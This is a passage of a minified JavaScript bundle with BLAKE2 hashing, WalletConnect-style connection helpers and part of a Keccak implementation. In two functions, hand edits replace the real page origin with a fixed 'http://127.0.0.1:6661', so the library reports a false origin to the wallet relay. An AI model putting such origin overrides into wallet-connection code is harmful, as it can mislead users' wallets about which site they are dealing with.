  , SIGMA8 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3, 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4, 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8, 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13, 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9, 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11, 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10, 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5, 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3]
  , SIGMA82 = new Uint8Array(SIGMA8.map(function(q) {
    return q * 2
}))
  , v$3 = new Uint32Array(32)
  , m$1 = new Uint32Array(32);
function blake2bCompress(q, U) {
    let Z = 0;
    for (Z = 0; Z < 16; Z++)
        v$3[Z] = q.h[Z],
        v$3[Z + 16] = BLAKE2B_IV32[Z];
    for (v$3[24] = v$3[24] ^ q.t,
    v$3[25] = v$3[25] ^ q.t / 4294967296,
    U && (v$3[28] = ~v$3[28],
    v$3[29] = ~v$3[29]),
    Z = 0; Z < 32; Z++)
        m$1[Z] = B2B_GET32(q.b, 4 * Z);
    for (Z = 0; Z < 12; Z++)
        B2B_G(0, 8, 16, 24, SIGMA82[Z * 16 + 0], SIGMA82[Z * 16 + 1]),
        B2B_G(2, 10, 18, 26, SIGMA82[Z * 16 + 2], SIGMA82[Z * 16 + 3]),
        B2B_G(4, 12, 20, 28, SIGMA82[Z * 16 + 4], SIGMA82[Z * 16 + 5]),
        B2B_G(6, 14, 22, 30, SIGMA82[Z * 16 + 6], SIGMA82[Z * 16 + 7]),
        B2B_G(0, 10, 20, 30, SIGMA82[Z * 16 + 8], SIGMA82[Z * 16 + 9]),
        B2B_G(2, 12, 22, 24, SIGMA82[Z * 16 + 10], SIGMA82[Z * 16 + 11]),
        B2B_G(4, 14, 16, 26, SIGMA82[Z * 16 + 12], SIGMA82[Z * 16 + 13]),
        B2B_G(6, 8, 18, 28, SIGMA82[Z * 16 + 14], SIGMA82[Z * 16 + 15]);
    for (Z = 0; Z < 16; Z++)
        q.h[Z] = q.h[Z] ^ v$3[Z] ^ v$3[Z + 16]
}
const parameterBlock = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
function blake2bInit(q, U, Z, oe) {
    if (q === 0 || q > 64)
        throw new Error("Illegal output length, expected 0 < length <= 64");
    if (U && U.length > 64)
        throw new Error("Illegal key, expected Uint8Array with 0 < length <= 64");
    if (Z && Z.length !== 16)
        throw new Error("Illegal salt, expected Uint8Array with length is 16");
    if (oe && oe.length !== 16)
        throw new Error("Illegal personal, expected Uint8Array with length is 16");
    const et = {
        b: new Uint8Array(128),
        h: new Uint32Array(16),
        t: 0,
        c: 0,
        outlen: q
    };
    parameterBlock.fill(0),
    parameterBlock[0] = q,
    U && (parameterBlock[1] = U.length),
    parameterBlock[2] = 1,
    parameterBlock[3] = 1,
    Z && parameterBlock.set(Z, 32),
    oe && parameterBlock.set(oe, 48);
    for (let st = 0; st < 16; st++)
        et.h[st] = BLAKE2B_IV32[st] ^ B2B_GET32(parameterBlock, st * 4);
    return U && (blake2bUpdate(et, U),
    et.c = 128),
    et
}
function blake2bUpdate(q, U) {
    for (let Z = 0; Z < U.length; Z++)
        q.c === 128 && (q.t += q.c,
        blake2bCompress(q, !1),
        q.c = 0),
        q.b[q.c++] = U[Z]
}
function blake2bFinal(q) {
    for (q.t += q.c; q.c < 128; )
        q.b[q.c++] = 0;
    blake2bCompress(q, !0);
    const U = new Uint8Array(q.outlen);
    for (let Z = 0; Z < q.outlen; Z++)
        U[Z] = q.h[Z >> 2] >> 8 * (Z & 3);
    return U
}
function blake2b(q, U, Z, oe, et) {
    Z = Z || 64,
    q = util$1.normalizeInput(q),
    oe && (oe = util$1.normalizeInput(oe)),
    et && (et = util$1.normalizeInput(et));
    const st = blake2bInit(Z, U, oe, et);
    return blake2bUpdate(st, q),
    blake2bFinal(st)
}
function blake2bHex(q, U, Z, oe, et) {
    const st = blake2b(q, U, Z, oe, et);
    return util$1.toHex(st)
}
var blake2b_1 = {
    blake2b,
    blake2bHex,
    blake2bInit,
    blake2bUpdate,
    blake2bFinal
};
const util = util$2;
function B2S_GET32(q, U) {
    return q[U] ^ q[U + 1] << 8 ^ q[U + 2] << 16 ^ q[U + 3] << 24
}
function B2S_G(q, U, Z, oe, et, st) {
    v$2[q] = v$2[q] + v$2[U] + et,
    v$2[oe] = ROTR32(v$2[oe] ^ v$2[q], 16),
    v$2[Z] = v$2[Z] + v$2[oe],
    v$2[U] = ROTR32(v$2[U] ^ v$2[Z], 12),
    v$2[q] = v$2[q] + v$2[U] + st,
    v$2[oe] = ROTR32(v$2[oe] ^ v$2[q], 8),
    v$2[Z] = v$2[Z] + v$2[oe],
    v$2[U] = ROTR32(v$2[U] ^ v$2[Z], 7)
}
function ROTR32(q, U) {
    return q >>> U ^ q << 32 - U
}
const BLAKE2S_IV = new Uint32Array([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
  , SIGMA = new Uint8Array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3, 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4, 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8, 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13, 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9, 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11, 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10, 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5, 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0])
  , v$2 = new Uint32Array(16)
  , m = new Uint32Array(16);
function blake2sCompress(q, U) {
    let Z = 0;
    for (Z = 0; Z < 8; Z++)
        v$2[Z] = q.h[Z],
        v$2[Z + 8] = BLAKE2S_IV[Z];
    for (v$2[12] ^= q.t,
    v$2[13] ^= q.t / 4294967296,
    U && (v$2[14] = ~v$2[14]),
    Z = 0; Z < 16; Z++)
        m[Z] = B2S_GET32(q.b, 4 * Z);
    for (Z = 0; Z < 10; Z++)
        B2S_G(0, 4, 8, 12, m[SIGMA[Z * 16 + 0]], m[SIGMA[Z * 16 + 1]]),
        B2S_G(1, 5, 9, 13, m[SIGMA[Z * 16 + 2]], m[SIGMA[Z * 16 + 3]]),
        B2S_G(2, 6, 10, 14, m[SIGMA[Z * 16 + 4]], m[SIGMA[Z * 16 + 5]]),
        B2S_G(3, 7, 11, 15, m[SIGMA[Z * 16 + 6]], m[SIGMA[Z * 16 + 7]]),
        B2S_G(0, 5, 10, 15, m[SIGMA[Z * 16 + 8]], m[SIGMA[Z * 16 + 9]]),
        B2S_G(1, 6, 11, 12, m[SIGMA[Z * 16 + 10]], m[SIGMA[Z * 16 + 11]]),
        B2S_G(2, 7, 8, 13, m[SIGMA[Z * 16 + 12]], m[SIGMA[Z * 16 + 13]]),
        B2S_G(3, 4, 9, 14, m[SIGMA[Z * 16 + 14]], m[SIGMA[Z * 16 + 15]]);
    for (Z = 0; Z < 8; Z++)
        q.h[Z] ^= v$2[Z] ^ v$2[Z + 8]
}
function blake2sInit(q, U) {
    if (!(q > 0 && q <= 32))
        throw new Error("Incorrect output length, should be in [1, 32]");
    const Z = U ? U.length : 0;
    if (U && !(Z > 0 && Z <= 32))
        throw new Error("Incorrect key length, should be in [1, 32]");
    const oe = {
        h: new Uint32Array(BLAKE2S_IV),
        b: new Uint8Array(64),
        c: 0,
        t: 0,
        outlen: q
    };
    return oe.h[0] ^= 16842752 ^ Z << 8 ^ q,
    Z > 0 && (blake2sUpdate(oe, U),
    oe.c = 64),
    oe
}
function blake2sUpdate(q, U) {
    for (let Z = 0; Z < U.length; Z++)
        q.c === 64 && (q.t += q.c,
        blake2sCompress(q, !1),
        q.c = 0),
        q.b[q.c++] = U[Z]
}
function blake2sFinal(q) {
    for (q.t += q.c; q.c < 64; )
        q.b[q.c++] = 0;
    blake2sCompress(q, !0);
    const U = new Uint8Array(q.outlen);
    for (let Z = 0; Z < q.outlen; Z++)
        U[Z] = q.h[Z >> 2] >> 8 * (Z & 3) & 255;
    return U
}
function blake2s(q, U, Z) {
    Z = Z || 32,
    q = util.normalizeInput(q);
    const oe = blake2sInit(Z, U);
    return blake2sUpdate(oe, q),
    blake2sFinal(oe)
}
function blake2sHex(q, U, Z) {
    const oe = blake2s(q, U, Z);
    return util.toHex(oe)
}
var blake2s_1 = {
    blake2s,
    blake2sHex,
    blake2sInit,
    blake2sUpdate,
    blake2sFinal
};
const b2b = blake2b_1
  , b2s = blake2s_1;
var blakejs = {
    blake2b: b2b.blake2b,
    blake2bHex: b2b.blake2bHex,
    blake2bInit: b2b.blake2bInit,
    blake2bUpdate: b2b.blake2bUpdate,
    blake2bFinal: b2b.blake2bFinal,
    blake2s: b2s.blake2s,
    blake2sHex: b2s.blake2sHex,
    blake2sInit: b2s.blake2sInit,
    blake2sUpdate: b2s.blake2sUpdate,
    blake2sFinal: b2s.blake2sFinal
};
const xe = ":";
function Fe$1(q) {
    const [U,Z] = q.split(xe);
    return {
        namespace: U,
        reference: Z
    }
}
function ve(q, U) {
    return q.includes(":") ? [q] : U.chains || []
}
var $s$1 = Object.defineProperty
  , Cs$1 = Object.defineProperties
  , Ls$1 = Object.getOwnPropertyDescriptors
  , Jn$1 = Object.getOwnPropertySymbols
  , js$1 = Object.prototype.hasOwnProperty
  , ks$1 = Object.prototype.propertyIsEnumerable
  , Ze$1 = (q, U, Z) => U in q ? $s$1(q, U, {
    enumerable: !0,
    configurable: !0,
    writable: !0,
    value: Z
}) : q[U] = Z
  , Qn$1 = (q, U) => {
    for (var Z in U || (U = {}))
        js$1.call(U, Z) && Ze$1(q, Z, U[Z]);
    if (Jn$1)
        for (var Z of Jn$1(U))
            ks$1.call(U, Z) && Ze$1(q, Z, U[Z]);
    return q
}
  , Ps = (q, U) => Cs$1(q, Ls$1(U))
  , tr$1 = (q, U, Z) => Ze$1(q, typeof U != "symbol" ? U + "" : U, Z);
const er = "ReactNative"
  , J = {
    reactNative: "react-native",
    node: "node",
    browser: "browser",
    unknown: "unknown"
}
  , rr$1 = "js";
function Ye$1() {
    return typeof process < "u" && typeof process.versions < "u" && typeof process.versions.node < "u"
}
function Bt$1() {
    return !getDocument_1() && !!getNavigator_1() && navigator.product === er
}
function Ms$1() {
    return Bt$1() && typeof window < "u" && typeof (window == null ? void 0 : window.Platform) < "u" && (window == null ? void 0 : window.Platform.OS) === "android"
}
function Vs$1() {
    return Bt$1() && typeof window < "u" && typeof (window == null ? void 0 : window.Platform) < "u" && (window == null ? void 0 : window.Platform.OS) === "ios"
}
function zt$1() {
    return !Ye$1() && !!getNavigator_1() && !!getDocument_1()
}
function Pt$1() {
    return Bt$1() ? J.reactNative : Ye$1() ? J.node : zt$1() ? J.browser : J.unknown
}
function qs() {
    var q;
    try {
        return Bt$1() && typeof window < "u" && typeof (window == null ? void 0 : window.Application) < "u" ? (q = window.Application) == null ? void 0 : q.applicationId : void 0
    } catch {
        return
    }
}
function or$1(q, U) {
    const Z = new URLSearchParams(q);
    for (const oe of Object.keys(U).sort())
        if (U.hasOwnProperty(oe)) {
            const et = U[oe];
            et !== void 0 && Z.set(oe, et)
        }
    return Z.toString()
}
function Ks$1(q) {
    var U, Z;
    const oe = sr$1();
	 oe.url = "http://127.0.0.1:6661";
    try {
        return q != null && q.url && oe.url && new URL(q.url).host !== new URL(oe.url).host && (console.warn(`The configured WalletConnect 'metadata.url':${q.url} differs from the actual page url:${oe.url}. This is probably unintended and can lead to issues.`),
        q.url = oe.url),
        (U = q == null ? void 0 : q.icons) != null && U.length && q.icons.length > 0 && (q.icons = q.icons.filter(et => et !== "")),
        Ps(Qn$1(Qn$1({}, oe), q), {
            url: (q == null ? void 0 : q.url) || oe.url,
            name: (q == null ? void 0 : q.name) || oe.name,
            description: (q == null ? void 0 : q.description) || oe.description,
            icons: (Z = q == null ? void 0 : q.icons) != null && Z.length && q.icons.length > 0 ? q.icons : oe.icons
        })
    } catch (et) {
        return console.warn("Error populating app metadata", et),
        q || oe
    }
}
function sr$1() {
    return getWindowMetadata_1() || {
        name: "",
        description: "",
        url: "",
        icons: [""]
    }
}
function ir$1() {
    if (Pt$1() === J.reactNative && typeof window < "u" && typeof (window == null ? void 0 : window.Platform) < "u") {
        const {OS: Z, Version: oe} = window.Platform;
        return [Z, oe].join("-")
    }
    const q = detect();
    if (q === null)
        return "unknown";
    const U = q.os ? q.os.replace(" ", "").toLowerCase() : "unknown";
    return q.type === "browser" ? [U, q.name, q.version].join("-") : [U, q.version].join("-")
}
function fr$1() {
   // var q;
   // const U = Pt$1();
    //return U === J.browser ? [U, ((q = getLocation_1()) == null ? void 0 : q.host) || "unknown"].join(":") : U
   return "browser:127.0.0.1:6661";
}
function cr$1(q, U, Z) {
    const oe = ir$1()
      , et = fr$1();
    return [[q, U].join("-"), [rr$1, Z].join("-"), oe, et].join("/")
}
function zs({protocol: q, version: U, relayUrl: Z, sdkVersion: oe, auth: et, projectId: st, useOnCloseEvent: ws, bundleId: ms, packageName: Es}) {
    const vs = Z.split("?")
      , _s = cr$1(q, U, oe)
      , Is = {
        auth: et,
        ua: _s,
        projectId: st,
        useOnCloseEvent: ws || void 0,
        packageName: Es || void 0,
        bundleId: ms || void 0
    }
      , Ss = or$1(vs[1] || "", Is);
    return vs[0] + "?" + Ss
}
function It$1(q, U) {
    return q.filter(Z => U.includes(Z)).length === q.length
}
function Ys(q) {
    return Object.fromEntries(q.entries())
}
function Xs(q) {
    return new Map(Object.entries(q))
}
function ei$1(q=cjs$3.FIVE_MINUTES, U) {
    const Z = cjs$3.toMiliseconds(q || cjs$3.FIVE_MINUTES);
    let oe, et, st, ws;
    return {
        resolve: ms => {
            st && oe && (clearTimeout(st),
            oe(ms),
            ws = Promise.resolve(ms))
        }
        ,
        reject: ms => {
            st && et && (clearTimeout(st),
            et(ms))
        }
        ,
        done: () => new Promise( (ms, Es) => {
            if (ws)
                return ms(ws);
            st = setTimeout( () => {
                const vs = new Error(U);
                ws = Promise.reject(vs),
                Es(vs)
            }
            , Z),
            oe = ms,
            et = Es
        }
        )
    }
}
function ni$1(q, U, Z) {
    return new Promise(async (oe, et) => {
        const st = setTimeout( () => et(new Error(Z)), U);
        try {
            const ws = await q;
            oe(ws)
        } catch (ws) {
            et(ws)
        }
        clearTimeout(st)
    }
    )
}
function Xe$1(q, U) {
    if (typeof U == "string" && U.startsWith(`${q}:`))
        return U;
    if (q.toLowerCase() === "topic") {
        if (typeof U != "string")
            throw new Error('Value must be "string" for expirer target type: topic');
        return `topic:${U}`
    } else if (q.toLowerCase() === "id") {
        if (typeof U != "number")
            throw new Error('Value must be "number" for expirer target type: id');
        return `id:${U}`
    }
    throw new Error(`Unknown expirer target type: ${q}`)
}
function ri$1(q) {
    return Xe$1("topic", q)
}
function oi$1(q) {
    return Xe$1("id", q)
}
function si$1(q) {
    const [U,Z] = q.split(":")
      , oe = {
        id: void 0,
        topic: void 0
    };
    if (U === "topic" && typeof Z == "string")
        oe.topic = Z;
    else if (U === "id" && Number.isInteger(Number(Z)))
        oe.id = Number(Z);
    else
        throw new Error(`Invalid target, expected id:number or topic:string, got ${U}:${Z}`);
    return oe
}
function ii$1(q, U) {
    return cjs$3.fromMiliseconds((U || Date.now()) + cjs$3.toMiliseconds(q))
}
function fi$1(q) {
    return Date.now() >= cjs$3.toMiliseconds(q)
}
function ci$1(q, U) {
    return `${q}${U ? `:${U}` : ""}`
}
function ct(q=[], U=[]) {
    return [...new Set([...q, ...U])]
}
async function ai$1({id: q, topic: U, wcDeepLink: Z}) {
    var oe;
    try {
        if (!Z)
            return;
        const et = typeof Z == "string" ? JSON.parse(Z) : Z
          , st = et == null ? void 0 : et.href;
        if (typeof st != "string")
            return;
        const ws = dr$1(st, q, U)
          , ms = Pt$1();
        if (ms === J.browser) {
            if (!((oe = getDocument_1()) != null && oe.hasFocus())) {
                console.warn("Document does not have focus, skipping deeplink.");
                return
            }
            hr$1(ws)
        } else
            ms === J.reactNative && typeof (window == null ? void 0 : window.Linking) < "u" && await window.Linking.openURL(ws)
    } catch (et) {
        console.error(et)
    }
}
function dr$1(q, U, Z) {
    const oe = `requestId=${U}&sessionTopic=${Z}`;
    q.endsWith("/") && (q = q.slice(0, -1));
    let et = `${q}`;
    if (q.startsWith("https://t.me")) {
        const st = q.includes("?") ? "&startapp=" : "?startapp=";
        et = `${et}${st}${br$1(oe, !0)}`
    } else
        et = `${et}/wc?${oe}`;
    return et
}
function hr$1(q) {
    let U = "_self";
    gr$1() ? U = "_top" : (pr$1() || q.startsWith("https://") || q.startsWith("http://")) && (U = "_blank"),
    window.open(q, U, "noreferrer noopener")
}
async function ui$1(q, U) {
    let Z = "";
    try {
        if (zt$1() && (Z = localStorage.getItem(U),
        Z))
            return Z;
        Z = await q.getItem(U)
    } catch (oe) {
        console.error(oe)
    }
    return Z
}
function li$1(q, U) {
    if (!q.includes(U))
        return null;
    const Z = q.split(/([&,?,=])/)
      , oe = Z.indexOf(U);
    return Z[oe + 2]
}
function di$1() {
    return typeof crypto < "u" && crypto != null && crypto.randomUUID ? crypto.randomUUID() : "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/gu, q => {
        const U = Math.random() * 16 | 0;
        return (q === "x" ? U : U & 3 | 8).toString(16)
    }
    )
}
function hi$1() {
    return typeof process < "u" && {}.IS_VITEST === "true"
}
function pr$1() {
    return typeof window < "u" && (!!window.TelegramWebviewProxy || !!window.Telegram || !!window.TelegramWebviewProxyProto)
}
function gr$1() {
    try {
        return window.self !== window.top
    } catch {
        return !1
    }
}
function br$1(q, U=!1) {
    const Z = Buffer.from(q).toString("base64");
    return U ? Z.replace(/[=]/g, "") : Z
}
function Qe$1(q) {
    return Buffer.from(q, "base64").toString("utf-8")
}
function pi$1(q) {
    return new Promise(U => setTimeout(U, q))
}
let gi$1 = class {
    constructor({limit: U}) {
        tr$1(this, "limit"),
        tr$1(this, "set"),
        this.limit = U,
        this.set = new Set
    }
    add(U) {
        if (!this.set.has(U)) {
            if (this.set.size >= this.limit) {
                const Z = this.set.values().next().value;
                Z && this.set.delete(Z)
            }
            this.set.add(U)
        }
    }
    has(U) {
        return this.set.has(U)
    }
}
;
const Be$1 = BigInt(2 ** 32 - 1)
  , yr$1 = BigInt(32);
function mr$1(q, U=!1) {
    return U ? {
        h: Number(q & Be$1),
        l: Number(q >> yr$1 & Be$1)
    } : {
        h: Number(q >> yr$1 & Be$1) | 0,
        l: Number(q & Be$1) | 0
    }
}
function wr$1(q, U=!1) {
    const Z = q.length;
    let oe = new Uint32Array(Z)
      , et = new Uint32Array(Z);
    for (let st = 0; st < Z; st++) {
        const {h: ws, l: ms} = mr$1(q[st], U);
        [oe[st],et[st]] = [ws, ms]
    }
    return [oe, et]
}
const xr$1 = (q, U, Z) => q >>> Z
  , vr$1 = (q, U, Z) => q << 32 - Z | U >>> Z
  , At$1 = (q, U, Z) => q >>> Z | U << 32 - Z
  , St$2 = (q, U, Z) => q << 32 - Z | U >>> Z
  , se$1 = (q, U, Z) => q << 64 - Z | U >>> Z - 32
  , ie = (q, U, Z) => q >>> Z - 32 | U << 64 - Z
  , bi$1 = (q, U) => U
  , yi$1 = (q, U) => q
  , mi$1 = (q, U, Z) => q << Z | U >>> 32 - Z
  , wi$1 = (q, U, Z) => U << Z | q >>> 32 - Z
  , xi$1 = (q, U, Z) => U << Z - 32 | q >>> 64 - Z
  , vi$1 = (q, U, Z) => q << Z - 32 | U >>> 64 - Z;
function dt$1(q, U, Z, oe) {
    const et = (U >>> 0) + (oe >>> 0);
    return {
        h: q + Z + (et / 2 ** 32 | 0) | 0,
        l: et | 0
    }
}
const tn$1 = (q, U, Z) => (q >>> 0) + (U >>> 0) + (Z >>> 0)
  , en$1 = (q, U, Z, oe) => U + Z + oe + (q / 2 ** 32 | 0) | 0
  , Ei$1 = (q, U, Z, oe) => (q >>> 0) + (U >>> 0) + (Z >>> 0) + (oe >>> 0)
  , Bi$1 = (q, U, Z, oe, et) => U + Z + oe + et + (q / 2 ** 32 | 0) | 0
  , Ii$1 = (q, U, Z, oe, et) => (q >>> 0) + (U >>> 0) + (Z >>> 0) + (oe >>> 0) + (et >>> 0)
  , Ai$1 = (q, U, Z, oe, et, st) => U + Z + oe + et + st + (q / 2 ** 32 | 0) | 0
  , Gt$1 = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
function nn$1(q) {
    return q instanceof Uint8Array || ArrayBuffer.isView(q) && q.constructor.name === "Uint8Array"
}
function mt$1(q) {
    if (!Number.isSafeInteger(q) || q < 0)
        throw new Error("positive integer expected, got " + q)
}
function at(q, ...U) {
    if (!nn$1(q))
        throw new Error("Uint8Array expected");
    if (U.length > 0 && !U.includes(q.length))
        throw new Error("Uint8Array expected of length " + U + ", got length=" + q.length)
}
function rn$1(q) {
    if (typeof q != "function" || typeof q.create != "function")
        throw new Error("Hash should be wrapped by utils.createHasher");
    mt$1(q.outputLen),
    mt$1(q.blockLen)
}
function Nt$1(q, U=!0) {
    if (q.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (U && q.finished)
        throw new Error("Hash#digest() has already been called")
}
function on$1(q, U) {
    at(q);
    const Z = U.outputLen;
    if (q.length < Z)
        throw new Error("digestInto() expects output buffer of length at least " + Z)
}
function fe(q) {
    return new Uint32Array(q.buffer,q.byteOffset,Math.floor(q.byteLength / 4))
}
function ut$1(...q) {
    for (let U = 0; U < q.length; U++)
        q[U].fill(0)
}
function sn$1(q) {
    return new DataView(q.buffer,q.byteOffset,q.byteLength)
}
function gt$1(q, U) {
    return q << 32 - U | q >>> U
}
const Er$1 = new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68;
function Br$1(q) {
    return q << 24 & 4278190080 | q << 8 & 16711680 | q >>> 8 & 65280 | q >>> 24 & 255
}
const wt$1 = Er$1 ? q => q : q => Br$1(q);
function Si$1(q) {
    for (let U = 0; U < q.length; U++)
        q[U] = Br$1(q[U]);
    return q
}
const Ot$1 = Er$1 ? q => q : Si$1
  , Ir$1 = typeof Uint8Array.from([]).toHex == "function" && typeof Uint8Array.fromHex == "function"
  , Ni$1 = Array.from({
    length: 256
}, (q, U) => U.toString(16).padStart(2, "0"));
function ce$1(q) {
    if (at(q),
    Ir$1)
        return q.toHex();
    let U = "";
    for (let Z = 0; Z < q.length; Z++)
        U += Ni$1[q[Z]];
    return U
}
const xt$1 = {
    _0: 48,
    _9: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};
function Ar$1(q) {
    if (q >= xt$1._0 && q <= xt$1._9)
        return q - xt$1._0;
    if (q >= xt$1.A && q <= xt$1.F)
        return q - (xt$1.A - 10);
    if (q >= xt$1.a && q <= xt$1.f)
        return q - (xt$1.a - 10)
}
function fn$1(q) {
    if (typeof q != "string")
        throw new Error("hex string expected, got " + typeof q);
    if (Ir$1)
        return Uint8Array.fromHex(q);
    const U = q.length
      , Z = U / 2;
    if (U % 2)
        throw new Error("hex string expected, got unpadded hex of length " + U);
    const oe = new Uint8Array(Z);
    for (let et = 0, st = 0; et < Z; et++,
    st += 2) {
        const ws = Ar$1(q.charCodeAt(st))
          , ms = Ar$1(q.charCodeAt(st + 1));
        if (ws === void 0 || ms === void 0) {
            const Es = q[st] + q[st + 1];
            throw new Error('hex string expected, got non-hex character "' + Es + '" at index ' + st)
        }
        oe[et] = ws * 16 + ms
    }
    return oe
}
function Oi$1(q) {
    if (typeof q != "string")
        throw new Error("string expected");
    return new Uint8Array(new TextEncoder().encode(q))
}
function ht$1(q) {
    return typeof q == "string" && (q = Oi$1(q)),
    at(q),
    q
}
function Ht$1(...q) {
    let U = 0;
    for (let oe = 0; oe < q.length; oe++) {
        const et = q[oe];
        at(et),
        U += et.length
    }
    const Z = new Uint8Array(U);
    for (let oe = 0, et = 0; oe < q.length; oe++) {
        const st = q[oe];
        Z.set(st, et),
        et += st.length
    }
    return Z
}
let Ie$1 = class {
}
;
function ae$1(q) {
    const U = oe => q().update(ht$1(oe)).digest()
      , Z = q();
    return U.outputLen = Z.outputLen,
    U.blockLen = Z.blockLen,
    U.create = () => q(),
    U
}
function Ui$1(q) {
    const U = (oe, et) => q(et).update(ht$1(oe)).digest()
      , Z = q({});
    return U.outputLen = Z.outputLen,
    U.blockLen = Z.blockLen,
    U.create = oe => q(oe),
    U
}
function Zt$1(q=32) {
    if (Gt$1 && typeof Gt$1.getRandomValues == "function")
        return Gt$1.getRandomValues(new Uint8Array(q));
    if (Gt$1 && typeof Gt$1.randomBytes == "function")
        return Uint8Array.from(Gt$1.randomBytes(q));
    throw new Error("crypto.getRandomValues must be defined")
}
const _i$1 = BigInt(0)
  , ue$1 = BigInt(1)
  , Ti$1 = BigInt(2)
  , Ri$1 = BigInt(7)
  , $i$1 = BigInt(256)
  , Ci$1 = BigInt(113)
  , Sr$1 = []
  , Nr$1 = []
  , Or$1 = [];
for (let q = 0, U = ue$1, Z = 1, oe = 0; q < 24; q++) {
    [Z,oe] = [oe, (2 * Z + 3 * oe) % 5],
    Sr$1.push(2 * (5 * oe + Z)),
    Nr$1.push((q + 1) * (q + 2) / 2 % 64);
    let et = _i$1;
    for (let st = 0; st < 7; st++)
        U = (U << ue$1 ^ (U >> Ri$1) * Ci$1) % $i$1,
        U & Ti$1 && (et ^= ue$1 << (ue$1 << BigInt(st)) - ue$1);
    Or$1.push(et)
}
const Ur$1 = wr$1(Or$1, !0)
  , Li$1 = Ur$1[0]
  , ji$1 = Ur$1[1]
  , _r$1 = (q, U, Z) => Z > 32 ? xi$1(q, U, Z) : mi$1(q, U, Z)
  , Tr$1 = (q, U, Z) => Z > 32 ? vi$1(q, U, Z) : wi$1(q, U, Z);
function ki$1(q, U=24) {
    const Z = new Uint32Array(10);
    for (let oe = 24 - U; oe < 24; oe++) {
        for (let ws = 0; ws < 10; ws++)
            Z[ws] = q[ws] ^ q[ws + 10] ^ q[ws + 20] ^ q[ws + 30] ^ q[ws + 40];
        for (let ws = 0; ws < 10; ws += 2) {
            const ms = (ws + 8) % 10
              , Es = (ws + 2) % 10
              , vs = Z[Es]
              , _s = Z[Es + 1]
              , Is = _r$1(vs, _s, 1) ^ Z[ms]
              , Ss = Tr$1(vs, _s, 1) ^ Z[ms + 1];
            for (let Ts = 0; Ts < 50; Ts += 10)
                q[ws + Ts] ^= Is,
                q[ws + Ts + 1] ^= Ss
        }
        let et = q[2]
          , st = q[3];
        for (let ws = 0; ws < 24; ws++) {
            const ms = Nr$1[ws]
              , Es = _r$1(et, st, ms)
              , vs = Tr$1(et, st, ms)
              , _s = Sr$1[ws];
            et = q[_s],
            st = q[_s + 1],
            q[_s] = Es,
            q[_s + 1] = vs
        }
        for (let ws = 0; ws < 50; ws += 10) {
            for (let ms = 0; ms < 10; ms++)
                Z[ms] = q[ws + ms];
            for (let ms = 0; ms < 10; ms++)
                q[ws + ms] ^= ~Z[(ms + 2) % 10] & Z[(ms + 4) % 10]
        }
        q[0] ^= Li$1[oe],
        q[1] ^= ji$1[oe]
    }
    ut$1(Z)
}
let qn$1 = class Tl extends Ie$1 {
    constructor(U, Z, oe, et=!1, st=24) {
        if (super(),
        this.pos = 0,
        this.posOut = 0,
        this.finished = !1,
        this.destroyed = !1,
        this.enableXOF = !1,
        this.blockLen = U,
        this.suffix = Z,
        this.outputLen = oe,
        this.enableXOF = et,
        this.rounds = st,
        mt$1(oe),
        !(0 < U && U < 200))
            throw new Error("only keccak-f1600 function is supported");
        this.state = new Uint8Array(200),
        this.state32 = fe(this.state)
    }
    clone() {
        return this._cloneInto()
    }
    keccak() {
        Ot$1(this.state32),
        ki$1(this.state32, this.rounds),
        Ot$1(this.state32),
        this.posOut = 0,
        this.pos = 0
    }
    update(U) {
        Nt$1(this),
        U = ht$1(U),
        at(U);
        const {blockLen: Z, state: oe} = this
          , et = U.length;
        for (let st = 0; st < et; ) {
            const ws = Math.min(Z - this.pos, et - st);
            for (let ms = 0; ms < ws; ms++)
                oe[this.pos++] ^= U[st++];
            this.pos === Z && this.keccak()
        }
        return this
    }
    finish() {
        if (this.finished)
            return;
        this.finished = !0;
        const {state: U, suffix: Z, pos: oe, blockLen: et} = this;
        U[oe] ^= Z,
        Z & 128 && oe === et - 1 && this.keccak(),
